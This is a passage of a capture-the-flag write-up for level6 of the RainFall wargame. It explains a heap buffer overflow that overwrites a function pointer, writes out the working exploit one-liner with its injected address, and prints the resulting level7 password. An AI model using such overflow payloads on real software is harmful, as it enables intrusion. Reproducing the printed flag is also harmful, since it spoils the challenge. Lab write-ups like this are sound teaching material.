Here, we need to overwrite the value of `m` . To do so, we will again do a buffer overflow. What we know also, is that if you do 2 mallocs in a row, you will get two address that are side by side. So, we can easily overflow our buffer and write inside `ppcVar1` like so :

```bash
 ./level6 $(python -c 'print "A" * 64 + "\x54\x84\x04\x08" * 1000')
```

(It's a bit overkill but we could have done the same as level0-3 to find the right number so we overwrite only what we want, but we already did that at least 4 times).

>level6@RainFall:~$ ./level6 $(python -c 'print "A" * 64 + "\x54\x84\x04\x08" * 1000')
>f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d

```bash
su level7
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

